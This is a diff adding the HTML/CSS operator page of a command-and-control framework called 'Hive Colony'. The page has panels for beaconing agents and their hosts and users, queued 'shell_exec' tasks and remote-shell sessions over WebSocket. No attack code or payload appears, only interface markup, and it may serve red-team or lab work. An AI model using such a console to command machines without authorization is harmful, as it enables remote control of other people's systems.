@@ -1,0 +1,1010 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<meta name="color-scheme" content="dark">
+<title>Hive Colony — C2 Console</title>
+<link rel="icon" href="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'%3E%3Cpath d='M50 4 90 27v46L50 96 10 73V27z' fill='none' stroke='%23f5b942' stroke-width='7'/%3E%3Ccircle cx='50' cy='50' r='13' fill='%23f5b942'/%3E%3C/svg%3E">
+<style>
+/* ─────────────────────────────────────────────────────────────────────────
+   Hive Colony · C2 Operator Console
+   Fully self-contained: no CDNs, no external fonts, no trackers.
+   Every byte of this page is served by the Rust C2 server itself.
+   ───────────────────────────────────────────────────────────────────────── */
+:root{
+  --bg:#0a0e14; --bg-raise:#0d1320;
+  --panel:rgba(255,255,255,.024); --panel-2:rgba(255,255,255,.05);
+  --border:rgba(255,255,255,.07); --border-2:rgba(255,255,255,.16);
+  --text:#bfc7d5; --bright:#e8edf4; --muted:#5c6773; --dim:#38414f;
+  --amber:#f5b942; --amber-soft:rgba(245,185,66,.14);
+  --green:#73d0a0; --green-soft:rgba(115,208,160,.13);
+  --cyan:#5ccfe6;  --cyan-soft:rgba(92,207,230,.12);
+  --red:#f27983;   --red-soft:rgba(242,121,131,.12);
+  --gold:#ffd173;
+  --mono:"JetBrains Mono","Cascadia Code","SF Mono",ui-monospace,Menlo,Consolas,"Liberation Mono",monospace;
+  --r:14px; --r-s:9px;
+  --shadow:0 18px 50px -22px rgba(0,0,0,.85);
+}
+*{box-sizing:border-box;margin:0;padding:0}
+html{scrollbar-color:#263042 transparent}
+body{
+  font-family:var(--mono); font-size:13px; line-height:1.5; color:var(--text);
+  background:
+    radial-gradient(1100px 500px at 85% -10%, rgba(245,185,66,.055), transparent 60%),
+    radial-gradient(900px 480px at -10% 110%, rgba(92,207,230,.045), transparent 60%),
+    var(--bg);
+  min-height:100vh;
+  -webkit-font-smoothing:antialiased;
+}
+body::before{ /* subtle hex grid, inline SVG — nothing fetched */
+  content:""; position:fixed; inset:0; pointer-events:none; z-index:0;
+  background-image:url("data:image/svg+xml,%3Csvg width='28' height='49' viewBox='0 0 28 49' xmlns='http://www.w3.org/2000/svg'%3E%3Cg fill='%23f5b942' fill-opacity='0.028'%3E%3Cpath d='M13.99 9.25l13 7.5v15l-13 7.5L1 31.75v-15l12.99-7.5zM3 17.9v12.7l10.99 6.34 11-6.35V17.9l-11-6.34L3 17.9zM0 15l12.98-7.5V0h-2v6.35L0 12.69v2.3zm0 18.5L12.98 41v8h-2v-6.85L0 35.81v-2.3zM15 0v7.5L27.99 15H28v-2.31h-.01L17 6.35V0h-2zm0 49v-8l12.99-7.5H28v2.31h-.01L17 42.15V49h-2z'/%3E%3C/g%3E%3C/svg%3E");
+}
+::selection{background:rgba(245,185,66,.28)}
+a{color:var(--cyan);text-decoration:none}
+a:hover{text-decoration:underline}
+svg.i{width:15px;height:15px;flex:none;fill:none;stroke:currentColor;stroke-width:1.7;stroke-linecap:round;stroke-linejoin:round}
+
+/* ── header ─────────────────────────────────────────────────────────── */
+header.top{
+  position:sticky; top:0; z-index:40;
+  display:flex; align-items:center; gap:18px; flex-wrap:wrap;
+  padding:13px 22px;
+  background:rgba(10,14,20,.82); backdrop-filter:blur(14px); -webkit-backdrop-filter:blur(14px);
+  border-bottom:1px solid var(--border);
+}
+.brand{display:flex;align-items:center;gap:13px;min-width:0}
+.brand .logo{width:38px;height:38px;flex:none;filter:drop-shadow(0 0 12px rgba(245,185,66,.35));animation:logoFloat 7s ease-in-out infinite}
+@keyframes logoFloat{0%,100%{transform:translateY(0)}50%{transform:translateY(-2.5px)}}
+.brand h1{font-size:16px;font-weight:700;letter-spacing:.14em;color:var(--bright);white-space:nowrap}
+.brand h1 b{color:var(--amber);font-weight:700}
+.brand small{display:block;font-size:10px;letter-spacing:.22em;color:var(--muted);text-transform:uppercase;margin-top:1px}
+.controls{display:flex;align-items:center;gap:9px;margin-left:auto;flex-wrap:wrap}
+.pill{
+  display:inline-flex;align-items:center;gap:7px;height:30px;padding:0 12px;
+  border:1px solid var(--border);border-radius:999px;background:var(--panel);
+  font-size:11px;letter-spacing:.08em;color:var(--muted);white-space:nowrap;
+}
+.pill .dot{width:7px;height:7px;border-radius:50%;background:var(--dim);flex:none}
+body.live .pill.conn{color:var(--green);border-color:rgba(115,208,160,.35)}
+body.live .pill.conn .dot{background:var(--green);animation:pulse 2s ease-out infinite}
+body.err .pill.conn{color:var(--red);border-color:rgba(242,121,131,.4)}
+body.err .pill.conn .dot{background:var(--red)}
+body.auth .pill.conn{color:var(--gold);border-color:rgba(255,209,115,.4)}
+body.auth .pill.conn .dot{background:var(--gold)}
+@keyframes pulse{0%{box-shadow:0 0 0 0 rgba(115,208,160,.5)}75%{box-shadow:0 0 0 8px rgba(115,208,160,0)}100%{box-shadow:0 0 0 0 rgba(115,208,160,0)}}
+.keywrap{display:flex;align-items:center;gap:0;height:30px;border:1px solid var(--border);border-radius:999px;background:var(--panel);padding:0 4px 0 11px;transition:border-color .25s}
+.keywrap:focus-within{border-color:rgba(245,185,66,.5)}
+.keywrap svg{color:var(--muted)}
+.keywrap input{background:none;border:0;outline:0;color:var(--text);font:inherit;font-size:11px;width:120px;padding:0 6px}
+.keywrap input::placeholder{color:var(--dim)}
+.keywrap .kset{color:var(--green);display:none}
+body.keyed .keywrap .kset{display:inline}
+select.sel,button.btn{
+  height:30px;border:1px solid var(--border);border-radius:999px;background:var(--panel);
+  color:var(--text);font:inherit;font-size:11px;letter-spacing:.06em;cursor:pointer;
+  transition:border-color .2s,background .2s,transform .15s;
+}
+select.sel{padding:0 9px;outline:0}
+select.sel:hover{border-color:var(--border-2)}
+button.btn{display:inline-flex;align-items:center;gap:7px;padding:0 13px;white-space:nowrap}
+button.btn:hover{border-color:rgba(245,185,66,.55);background:var(--amber-soft);color:var(--bright)}
+button.btn:active{transform:scale(.96)}
+button.btn.primary{background:linear-gradient(135deg,rgba(245,185,66,.16),rgba(245,185,66,.07));border-color:rgba(245,185,66,.45);color:var(--amber)}
+button.btn.spin svg{animation:rot .7s linear infinite}
+@keyframes rot{to{transform:rotate(360deg)}}
+
+/* ── banners ────────────────────────────────────────────────────────── */
+.banner{
+  position:relative;z-index:30;display:flex;align-items:center;gap:10px;flex-wrap:wrap;
+  padding:9px 22px;font-size:12px;border-bottom:1px solid transparent;
+}
+.banner[hidden]{display:none}
+.banner.off{background:rgba(242,121,131,.09);border-color:rgba(242,121,131,.25);color:var(--red)}
+.banner.auth{background:rgba(255,209,115,.07);border-color:rgba(255,209,115,.25);color:var(--gold)}
+.banner b{font-weight:700}
+
+/* ── layout ─────────────────────────────────────────────────────────── */
+main{position:relative;z-index:1;max-width:1460px;margin:0 auto;padding:20px 22px 8px;display:grid;grid-template-columns:minmax(0,2.05fr) minmax(300px,1fr);gap:14px}
+.card{
+  position:relative;border:1px solid var(--border);border-radius:var(--r);
+  background:linear-gradient(180deg,var(--panel-2),var(--panel));
+  box-shadow:var(--shadow);overflow:hidden;
+  animation:cardIn .55s cubic-bezier(.22,.9,.32,1) both;
+  transition:border-color .25s,transform .25s;
+}
+.card:hover{border-color:var(--border-2)}
+@keyframes cardIn{from{opacity:0;transform:translateY(10px)}to{opacity:1;transform:none}}
+.card h2{
+  display:flex;align-items:center;gap:9px;font-size:10.5px;font-weight:700;
+  letter-spacing:.2em;text-transform:uppercase;color:var(--muted);
+  padding:13px 16px 11px;border-bottom:1px solid var(--border);
+}
+.card h2 svg{color:var(--amber)}
+.card h2 .right{margin-left:auto;display:flex;gap:6px;align-items:center;letter-spacing:.04em;text-transform:none}
+.card .body{padding:13px 16px}
+.card.kpi{animation-delay:.03s}
+.card.agents{grid-column:1;animation-delay:.08s}
+.card.chart{grid-row:1/span 2;animation-delay:.13s;display:flex;flex-direction:column}
+.card.tasks{animation-delay:.18s}
+.card.feed{grid-column:1;animation-delay:.23s;min-height:280px}
+.card.sessions{animation-delay:.28s}
+
+/* ── KPI row ────────────────────────────────────────────────────────── */
+.kpis{grid-column:1/-1;display:grid;grid-template-columns:repeat(auto-fit,minmax(158px,1fr));gap:14px}
+.kpis .card{padding:14px 16px 13px}
+.kpi-top{display:flex;align-items:center;gap:8px;font-size:10px;letter-spacing:.16em;text-transform:uppercase;color:var(--muted)}
+.kpi-top svg{color:var(--amber);opacity:.85}
+.kpi-val{font-size:27px;font-weight:700;color:var(--bright);font-variant-numeric:tabular-nums;margin-top:5px;line-height:1.15}
+.kpi-val.flash{animation:flash .55s ease}
+@keyframes flash{0%{color:var(--amber);text-shadow:0 0 18px rgba(245,185,66,.55)}100%{color:var(--bright)}}
+.kpi-sub{font-size:10.5px;color:var(--dim);margin-top:3px;letter-spacing:.04em}
+.kpi-sub .up{color:var(--green)}
+
+/* ── agents table ───────────────────────────────────────────────────── */
+.toolbar{display:flex;gap:8px;align-items:center;flex-wrap:wrap;padding:11px 16px;border-bottom:1px solid var(--border)}
+.chip{
+  height:25px;padding:0 11px;border-radius:999px;border:1px solid var(--border);
+  background:transparent;color:var(--muted);font:inherit;font-size:10.5px;letter-spacing:.06em;
+  cursor:pointer;transition:all .2s;display:inline-flex;align-items:center;gap:6px;
+}
+.chip:hover{border-color:var(--border-2);color:var(--text)}
+.chip.on{background:var(--amber-soft);border-color:rgba(245,185,66,.5);color:var(--amber)}
+.chip .n{color:inherit;opacity:.65}
+.search{display:flex;align-items:center;gap:8px;height:30px;border:1px solid var(--border);border-radius:999px;padding:0 12px;background:var(--panel);margin-left:auto;transition:border-color .25s}
+.search:focus-within{border-color:rgba(92,207,230,.45)}
+.search input{background:none;border:0;outline:0;color:var(--text);font:inherit;font-size:11.5px;width:150px}
+.search input::placeholder{color:var(--dim)}
+.search svg{color:var(--muted);width:13px;height:13px}
+.tbl-wrap{overflow:auto;max-height:335px}
+table{width:100%;border-collapse:collapse;font-size:12px}
+thead th{
+  position:sticky;top:0;z-index:2;text-align:left;font-size:9.5px;letter-spacing:.18em;
+  text-transform:uppercase;color:var(--dim);font-weight:700;padding:9px 16px;
+  background:rgba(13,19,32,.96);border-bottom:1px solid var(--border);white-space:nowrap;
+}
+tbody td{padding:9.5px 16px;border-bottom:1px solid rgba(255,255,255,.04);white-space:nowrap;vertical-align:middle}
+tbody tr{transition:background .18s}
+tbody tr:hover{background:rgba(255,255,255,.03)}
+tbody tr.newrow{animation:rowIn .6s ease}
+@keyframes rowIn{from{opacity:0;transform:translateX(-9px)}to{opacity:1;transform:none}}
+.aid{color:var(--cyan)}
+.role{display:inline-flex;align-items:center;gap:6px;font-size:11px;padding:2.5px 9px;border-radius:6px;border:1px solid}
+.role::before{content:"◆";font-size:9px}
+.role.q{color:var(--amber);border-color:rgba(245,185,66,.35);background:var(--amber-soft)}
+.role.q::before{content:"◇"}
+.role.w{color:var(--green);border-color:rgba(115,208,160,.32);background:var(--green-soft)}
+.role.w::before{content:"◈"}
+.role.d{color:var(--cyan);border-color:rgba(92,207,230,.32);background:var(--cyan-soft)}
+.role.d::before{content:"◆"}
+.role.h{color:var(--gold);border-color:rgba(255,209,115,.32);background:rgba(255,209,115,.09)}
+.role.h::before{content:"◉"}
+.role.u{color:var(--muted);border-color:var(--border);background:var(--panel)}
+.seen{display:inline-flex;align-items:center;gap:7px}
+.seen i{width:6.5px;height:6.5px;border-radius:50%;display:inline-block}
+.seen.fresh i{background:var(--green);box-shadow:0 0 8px rgba(115,208,160,.6)}
+.seen.warm i{background:var(--gold)}
+.seen.stale i{background:var(--red)}
+.mono-dim{color:var(--muted)}
+button.mini{
+  height:24px;padding:0 10px;border-radius:6px;border:1px solid var(--border);
+  background:transparent;color:var(--muted);font:inherit;font-size:10.5px;cursor:pointer;
+  display:inline-flex;align-items:center;gap:6px;transition:all .2s;
+}
+button.mini:hover{border-color:rgba(92,207,230,.5);color:var(--cyan);background:var(--cyan-soft)}
+.empty{padding:34px 16px;text-align:center;color:var(--dim);font-size:12px}
+.empty svg{width:30px;height:30px;color:var(--dim);opacity:.5;margin-bottom:9px}
+
+/* ── chart panel ────────────────────────────────────────────────────── */
+.chart-body{flex:1;display:flex;flex-direction:column;gap:12px;padding:14px 16px;min-height:230px}
+.now-rate{display:flex;align-items:baseline;gap:9px}
+.now-rate .v{font-size:24px;font-weight:700;color:var(--amber);font-variant-numeric:tabular-nums}
+.now-rate .u{font-size:10px;color:var(--muted);letter-spacing:.1em;text-transform:uppercase}
+.chart-wrap{position:relative;flex:1;min-height:150px}
+canvas{position:absolute;inset:0;width:100%;height:100%;display:block}
+.chart-legend{display:flex;gap:14px;font-size:10px;color:var(--dim);letter-spacing:.06em;flex-wrap:wrap}
+.chart-legend b{color:var(--muted);font-weight:400}
+.sparkstats{display:grid;grid-template-columns:repeat(3,1fr);gap:8px;margin-top:auto}
+.sparkstats div{border:1px solid var(--border);border-radius:var(--r-s);padding:8px 10px;background:var(--panel)}
+.sparkstats .k{font-size:9px;letter-spacing:.14em;color:var(--dim);text-transform:uppercase}
+.sparkstats .v{font-size:15px;color:var(--bright);font-variant-numeric:tabular-nums;margin-top:2px}
+
+/* ── tasks funnel ───────────────────────────────────────────────────── */
+.funnel{display:flex;flex-direction:column;gap:12px}
+.frow .lbl{display:flex;justify-content:space-between;font-size:11px;margin-bottom:5px}
+.frow .lbl b{font-weight:700;color:var(--bright);font-variant-numeric:tabular-nums}
+.frow .lbl span{color:var(--muted);letter-spacing:.1em;text-transform:uppercase;font-size:9.5px}
+.bar{height:7px;border-radius:99px;background:rgba(255,255,255,.05);overflow:hidden;position:relative}
+.bar>i{display:block;height:100%;border-radius:99px;width:0%;transition:width .8s cubic-bezier(.22,.9,.3,1)}
+.bar.total>i{background:linear-gradient(90deg,#8a94a7,#c3ccd9)}
+.bar.pending>i{background:linear-gradient(90deg,#f5b942,#ffd173);box-shadow:0 0 12px rgba(245,185,66,.35)}
+.bar.claimed>i{background:linear-gradient(90deg,#5ccfe6,#7fdcf0)}
+.bar.completed>i{background:linear-gradient(90deg,#5bb98f,#73d0a0);box-shadow:0 0 12px rgba(115,208,160,.3)}
+.task-foot{display:flex;align-items:center;justify-content:space-between;gap:10px;margin-top:2px}
+.task-foot .hint{font-size:10px;color:var(--dim);letter-spacing:.03em}
+
+/* ── live feed ──────────────────────────────────────────────────────── */
+.feed-list{max-height:330px;overflow:auto;padding:6px 0}
+.fitem{
+  display:grid;grid-template-columns:66px 86px minmax(0,1fr);gap:10px;align-items:baseline;
+  padding:6.5px 16px;border-left:2px solid transparent;font-size:11.5px;
+}
+.fitem.new{animation:slideIn .5s ease;border-left-color:var(--amber);background:linear-gradient(90deg,var(--amber-soft),transparent 55%)}
+@keyframes slideIn{from{opacity:0;transform:translateY(-7px)}to{opacity:1;transform:none}}
+.fitem .t{color:var(--dim);font-variant-numeric:tabular-nums}
+.fitem .who{color:var(--cyan);overflow:hidden;text-overflow:ellipsis}
+.fitem .what{color:var(--muted);overflow:hidden;text-overflow:ellipsis;white-space:nowrap}
+.fitem .what b{color:var(--text);font-weight:600}
+
+/* ── sessions ───────────────────────────────────────────────────────── */
+.sess-list{display:flex;flex-direction:column;gap:8px;padding:13px 16px;max-height:250px;overflow:auto}
+.sess{
+  display:flex;align-items:center;gap:10px;border:1px solid var(--border);border-radius:var(--r-s);
+  padding:9px 12px;background:var(--panel);animation:rowIn .5s ease;
+}
+.sess .sid{color:var(--cyan);font-size:11.5px}
+.sess .ag{color:var(--muted);font-size:10.5px;margin-left:auto}
+.sess i{width:7px;height:7px;border-radius:50%;background:var(--green);box-shadow:0 0 9px rgba(115,208,160,.55);flex:none}
+.sess.dead i{background:var(--red);box-shadow:none}
+
+/* ── footer ─────────────────────────────────────────────────────────── */
+footer{
+  position:relative;z-index:1;max-width:1460px;margin:0 auto;padding:10px 22px 26px;
+  display:flex;gap:8px 22px;flex-wrap:wrap;align-items:center;
+  font-size:10.5px;color:var(--dim);letter-spacing:.05em;
+}
+footer .sep{color:#232c3a}
+
+/* ── task dialog ────────────────────────────────────────────────────── */
+dialog{
+  border:1px solid var(--border-2);border-radius:var(--r);background:var(--bg-raise);color:var(--text);
+  width:min(480px,94vw);padding:0;box-shadow:0 40px 110px -20px rgba(0,0,0,.9);
+}
+dialog::backdrop{background:rgba(4,7,12,.72);backdrop-filter:blur(5px)}
+dialog[open]{animation:dlgIn .3s cubic-bezier(.2,.9,.3,1.2)}
+@keyframes dlgIn{from{opacity:0;transform:scale(.94) translateY(12px)}to{opacity:1;transform:none}}
+dlg-form,form.f{padding:16px 18px 18px;display:flex;flex-direction:column;gap:12px}
+form.f label{display:flex;flex-direction:column;gap:5px;font-size:10px;letter-spacing:.16em;text-transform:uppercase;color:var(--muted)}
+form.f input,form.f textarea,form.f select{
+  background:var(--panel);border:1px solid var(--border);border-radius:var(--r-s);color:var(--text);
+  font:inherit;font-size:12px;padding:8px 11px;outline:0;transition:border-color .2s;width:100%;
+}
+form.f input:focus,form.f textarea:focus,form.f select:focus{border-color:rgba(245,185,66,.5)}
+form.f textarea{min-height:74px;resize:vertical;font-size:11.5px}
+form.f .row2{display:grid;grid-template-columns:1fr 1fr;gap:12px}
+form.f .foot{display:flex;justify-content:flex-end;gap:9px;margin-top:2px}
+.ferr{color:var(--red);font-size:11px;min-height:14px}
+
+/* ── console drawer ─────────────────────────────────────────────────── */
+.drawer{
+  position:fixed;top:0;right:0;bottom:0;width:min(520px,96vw);z-index:60;
+  background:rgba(10,14,20,.985);border-left:1px solid var(--border-2);
+  transform:translateX(105%);transition:transform .38s cubic-bezier(.22,.9,.3,1);
+  display:flex;flex-direction:column;box-shadow:-30px 0 80px -30px rgba(0,0,0,.9);
+}
+.drawer.open{transform:none}
+.drawer header{
+  display:flex;align-items:center;gap:10px;padding:13px 16px;border-bottom:1px solid var(--border);
+}
+.drawer header .st{width:8px;height:8px;border-radius:50%;background:var(--dim);flex:none}
+.drawer.on header .st{background:var(--green);box-shadow:0 0 10px rgba(115,208,160,.7);animation:pulse 2s infinite}
+.drawer header .title{font-size:12px;color:var(--bright);letter-spacing:.05em}
+.drawer header .title small{display:block;color:var(--dim);font-size:10px;letter-spacing:.08em}
+.drawer header button{margin-left:auto}
+.drawer pre{
+  flex:1;overflow:auto;padding:14px 16px;font-size:11.5px;line-height:1.65;color:var(--text);
+  white-space:pre-wrap;word-break:break-word;
+}
+.drawer pre .in{color:var(--amber)}
+.drawer pre .sys{color:var(--dim);font-style:italic}
+.drawer pre .out{color:#c9d3e0}
+.cin{display:flex;gap:9px;padding:12px 16px;border-top:1px solid var(--border);align-items:center}
+.cin .ps{color:var(--amber);font-weight:700}
+.cin input{
+  flex:1;background:var(--panel);border:1px solid var(--border);border-radius:var(--r-s);
+  color:var(--text);font:inherit;font-size:12px;padding:9px 12px;outline:0;
+}
+.cin input:focus{border-color:rgba(245,185,66,.5)}
+
+/* ── toasts ─────────────────────────────────────────────────────────── */
+#toasts{position:fixed;right:18px;bottom:18px;z-index:80;display:flex;flex-direction:column;gap:9px}
+.toast{
+  display:flex;align-items:center;gap:10px;padding:10px 15px;border-radius:10px;
+  background:rgba(13,19,32,.97);border:1px solid var(--border-2);font-size:12px;color:var(--text);
+  box-shadow:var(--shadow);animation:toastIn .35s cubic-bezier(.2,.9,.3,1.15);max-width:340px;
+}
+.toast.ok{border-color:rgba(115,208,160,.45)}
+.toast.ok svg{color:var(--green)}
+.toast.err{border-color:rgba(242,121,131,.5)}
+.toast.err svg{color:var(--red)}
+.toast.bye{animation:toastOut .3s ease forwards}
+@keyframes toastIn{from{opacity:0;transform:translateX(24px)}to{opacity:1;transform:none}}
+@keyframes toastOut{to{opacity:0;transform:translateX(24px)}}
+
+/* ── skeleton (first load) ──────────────────────────────────────────── */
+.skel{position:relative;overflow:hidden;background:rgba(255,255,255,.045);border-radius:6px}
+.skel::after{
+  content:"";position:absolute;inset:0;transform:translateX(-100%);
+  background:linear-gradient(90deg,transparent,rgba(255,255,255,.06),transparent);
+  animation:shimmer 1.4s infinite;
+}
+@keyframes shimmer{to{transform:translateX(100%)}}
+
+/* ── responsive ─────────────────────────────────────────────────────── */
+@media (max-width:980px){
+  main{grid-template-columns:1fr}
+  .card.agents,.card.feed,.card.chart{grid-column:1;grid-row:auto}
+  .brand small{display:none}
+}
+@media (prefers-reduced-motion:reduce){
+  *,*::before,*::after{animation-duration:.001s!important;transition-duration:.001s!important}
+}
+</style>
+</head>
+<body>
+<header class="top">
+  <div class="brand">
+    <svg class="logo" viewBox="0 0 100 100" aria-hidden="true">
+      <path d="M50 5 88 27v46L50 95 12 73V27z" fill="none" stroke="#f5b942" stroke-width="5"/>
+      <path d="M50 20 74 34v28L50 76 26 62V34z" fill="rgba(245,185,66,.12)" stroke="#f5b942" stroke-width="2.4"/>
+      <ellipse cx="42" cy="50" rx="7.5" ry="10" fill="#f5b942"/>
+      <ellipse cx="58" cy="50" rx="7.5" ry="10" fill="#ffd173"/>
+      <circle cx="50" cy="42" r="2.4" fill="#0a0e14"/><circle cx="50" cy="58" r="2.4" fill="#0a0e14"/>
+    </svg>
+    <div>
+      <h1>HIVE <b>COLONY</b></h1>
+      <small>C2 Operator Console</small>
+    </div>
+  </div>
+  <div class="controls">
+    <span class="pill conn" id="connPill"><span class="dot"></span><span id="connTxt">CONNECTING</span></span>
+    <label class="keywrap" title="Operator API key (x-api-key) — only needed when the C2 runs with --api-key">
+      <svg class="i" viewBox="0 0 24 24"><circle cx="7.5" cy="15.5" r="4.5"/><path d="M11 12 21 2m-5 5 3 3m-5 -1 3 3"/></svg>
+      <input id="apiKey" type="password" placeholder="api key" autocomplete="off" spellcheck="false">
+      <span class="kset" title="key stored locally">✓</span>
+    </label>
+    <select class="sel" id="rate" title="Refresh interval">
+      <option value="1000">1s</option>
+      <option value="2000">2s</option>
+      <option value="3000" selected>3s</option>
+      <option value="5000">5s</option>
+      <option value="10000">10s</option>
+      <option value="0">paused</option>
+    </select>
+    <button class="btn" id="refresh" title="Refresh now">
+      <svg class="i" viewBox="0 0 24 24"><path d="M21 12a9 9 0 1 1-2.6-6.4M21 3v6h-6"/></svg>
+    </button>
+  </div>
+</header>
+
+<div class="banner off" id="offB" hidden>
+  <b>C2 unreachable</b><span id="offT"></span> — is it running? try <code>./hive.sh c2</code>&nbsp;· retrying automatically
+</div>
+<div class="banner auth" id="authB" hidden>
+  <b>401 — unauthorized.</b> This C2 requires an operator key: type it in the <i>api key</i> field (stored only in your browser).
+</div>
+
+<main id="app">
+  <section class="kpis">
+    <div class="card kpi"><div class="kpi-top"><svg class="i" viewBox="0 0 24 24"><path d="M12 2 21 7v10l-9 5-9-5V7z"/><circle cx="12" cy="12" r="3"/></svg>Agents</div><div class="kpi-val" id="kAgents">—</div><div class="kpi-sub" id="kAgentsSub">registered</div></div>
+    <div class="card kpi"><div class="kpi-top"><svg class="i" viewBox="0 0 24 24"><circle cx="12" cy="12" r="2"/><path d="M7.8 16.2a6 6 0 0 1 0-8.4M16.2 7.8a6 6 0 0 1 0 8.4M4.9 19.1a10 10 0 0 1 0-14.2M19.1 4.9a10 10 0 0 1 0 14.2"/></svg>Beacons</div><div class="kpi-val" id="kBeacons">—</div><div class="kpi-sub" id="kBeaconsSub">total received</div></div>
+    <div class="card kpi"><div class="kpi-top"><svg class="i" viewBox="0 0 24 24"><path d="M4 6h16M4 12h16M4 18h10"/></svg>Tasks</div><div class="kpi-val" id="kTasks">—</div><div class="kpi-sub" id="kTasksSub">queued in total</div></div>
+    <div class="card kpi"><div class="kpi-top"><svg class="i" viewBox="0 0 24 24"><circle cx="12" cy="12" r="9"/><path d="M12 7v5l3.5 2"/></svg>Pending</div><div class="kpi-val" id="kPending">—</div><div class="kpi-sub" id="kPendingSub">awaiting claim</div></div>
+    <div class="card kpi"><div class="kpi-top"><svg class="i" viewBox="0 0 24 24"><path d="M4 17l6-6-6-6M12 19h8"/></svg>Shell sessions</div><div class="kpi-val" id="kSess">—</div><div class="kpi-sub" id="kSessSub">operator consoles</div></div>
+  </section>
+
+  <section class="card agents">
+    <h2><svg class="i" viewBox="0 0 24 24"><path d="M12 2 21 7v10l-9 5-9-5V7z"/><path d="M12 22V12M9 8.5l6 0"/></svg>Colony agents
+      <span class="right" id="agentCount"></span>
+    </h2>
+    <div class="toolbar">
+      <button class="chip on" data-role="all">all <span class="n" id="nAll">0</span></button>
+      <button class="chip" data-role="queen">queen <span class="n" id="nQueen">0</span></button>
+      <button class="chip" data-role="worker">worker <span class="n" id="nWorker">0</span></button>
+      <button class="chip" data-role="drone">drone <span class="n" id="nDrone">0</span></button>
+      <button class="chip" data-role="honeybee">honeybee <span class="n" id="nHoneybee">0</span></button>
+      <label class="search">
+        <svg class="i" viewBox="0 0 24 24"><circle cx="11" cy="11" r="7"/><path d="m20 20-3.5-3.5"/></svg>
+        <input id="q" placeholder="filter agents…" autocomplete="off" spellcheck="false">
+      </label>
+    </div>
+    <div class="tbl-wrap">
+      <table>
+        <thead><tr><th>agent</th><th>role</th><th>host</th><th>user</th><th>os</th><th>ver</th><th>last seen</th><th></th></tr></thead>
+        <tbody id="agentsBody"><tr><td colspan="8"><div class="skel" style="height:14px;margin:9px 0"></div><div class="skel" style="height:14px;margin:9px 0"></div><div class="skel" style="height:14px;margin:9px 0"></div></td></tr></tbody>
+      </table>
+    </div>
+  </section>
+
+  <aside class="card chart">
+    <h2><svg class="i" viewBox="0 0 24 24"><path d="M3 17l5-6 4 3 6-8"/><path d="M3 21h18"/></svg>Beacon rate</h2>
+    <div class="chart-body">
+      <div class="now-rate"><span class="v" id="rateNow">—</span><span class="u">beacons / min</span></div>
+      <div class="chart-wrap"><canvas id="chart"></canvas></div>
+      <div class="chart-legend"><span>window <b id="lgWin">—</b></span><span>peak <b id="lgPeak">—</b></span><span>avg <b id="lgAvg">—</b></span></div>
+      <div class="sparkstats">
+        <div><div class="k">agents</div><div class="v" id="sAg">—</div></div>
+        <div><div class="k">claimed</div><div class="v" id="sCl">—</div></div>
+        <div><div class="k">completed</div><div class="v" id="sCo">—</div></div>
+      </div>
+    </div>
+  </aside>
+
+  <section class="card tasks">
+    <h2><svg class="i" viewBox="0 0 24 24"><path d="M4 6h16M4 12h16M4 18h10"/><circle cx="19" cy="18" r="2.5"/></svg>Task pipeline
+      <span class="right"><button class="btn primary" id="newTask"><svg class="i" viewBox="0 0 24 24"><path d="M12 5v14M5 12h14"/></svg>queue task</button></span>
+    </h2>
+    <div class="body">
+      <div class="funnel">
+        <div class="frow"><div class="lbl"><span>total</span><b id="fTotal">0</b></div><div class="bar total"><i id="bTotal"></i></div></div>
+        <div class="frow"><div class="lbl"><span>pending</span><b id="fPending">0</b></div><div class="bar pending"><i id="bPending"></i></div></div>
+        <div class="frow"><div class="lbl"><span>claimed</span><b id="fClaimed">0</b></div><div class="bar claimed"><i id="bClaimed"></i></div></div>
+        <div class="frow"><div class="lbl"><span>completed</span><b id="fCompleted">0</b></div><div class="bar completed"><i id="bCompleted"></i></div></div>
+      </div>
+      <div class="task-foot"><span class="hint">agents pull tasks via <b>GET /task/:id</b> — destructive types are rejected by the TaskPoller</span></div>
+    </div>
+  </section>
+
+  <section class="card feed">
+    <h2><svg class="i" viewBox="0 0 24 24"><path d="M4 12h4l3-8 4 16 3-8h4"/></svg>Live activity
+      <span class="right" id="feedInfo"></span>
+    </h2>
+    <div class="feed-list" id="feed"><div class="fitem"><span class="t">—</span><span class="who">loading…</span><span class="what"></span></div></div>
+  </section>
+
+  <aside class="card sessions">
+    <h2><svg class="i" viewBox="0 0 24 24"><rect x="3" y="4" width="18" height="16" rx="2"/><path d="m7 9 3 3-3 3M13 15h4"/></svg>Shell sessions</h2>
+    <div class="sess-list" id="sessions">
+      <div class="empty" style="padding:22px 8px"><svg class="i" viewBox="0 0 24 24"><rect x="3" y="4" width="18" height="16" rx="2"/><path d="m7 9 3 3-3 3M13 15h4"/></svg><br>no shell sessions — open a console from the agents table</div>
+    </div>
+  </aside>
+</main>
+
+<footer>
+  <span>Hive Colony v3.0 · Rust C2</span><span class="sep">|</span>
+  <span>GET /health · /logs · /admin/agents · /admin/metrics · /admin/sessions</span><span class="sep">|</span>
+  <span>POST /task/:agent · WS /shell/:id</span><span class="sep">|</span>
+  <span>self-contained page — zero external requests</span>
+</footer>
+
+<dialog id="taskDlg">
+  <form class="f" id="taskForm" method="dialog">
+    <h2 style="border:0;padding:16px 18px 0;font-size:12px;letter-spacing:.2em;color:var(--bright);text-transform:uppercase;display:block">Queue a task</h2>
+    <div style="padding:0 18px 2px">
+      <label>agent
+        <select id="tAgent" required></select>
+      </label>
+      <div class="row2">
+        <label>task id
+          <input id="tId" readonly>
+        </label>
+        <label>command
+          <input id="tCmd" value="shell_exec" placeholder="shell_exec" required>
+        </label>
+      </div>
+      <label>payload (json)
+        <textarea id="tPayload" spellcheck="false">{ }</textarea>
+      </label>
+      <div class="ferr" id="tErr"></div>
+    </div>
+    <div class="foot" style="padding:0 18px 18px">
+      <button class="btn" type="button" id="tCancel">cancel</button>
+      <button class="btn primary" type="submit" id="tSend"><svg class="i" viewBox="0 0 24 24"><path d="M22 2 11 13M22 2l-7 20-4-9-9-4z"/></svg>queue</button>
+    </div>
+  </form>
+</dialog>
+
+<div class="drawer" id="drawer">
+  <header>
+    <span class="st"></span>
+    <div class="title">remote shell<small id="drAgent">—</small></div>
+    <button class="btn" id="drClose">close</button>
+  </header>
+  <pre id="drOut"><span class="sys">connecting…</span></pre>
+  <div class="cin">
+    <span class="ps">❯</span>
+    <input id="drIn" placeholder="type a command and press enter…" autocomplete="off" spellcheck="false">
+  </div>
+</div>
+
+<div id="toasts"></div>
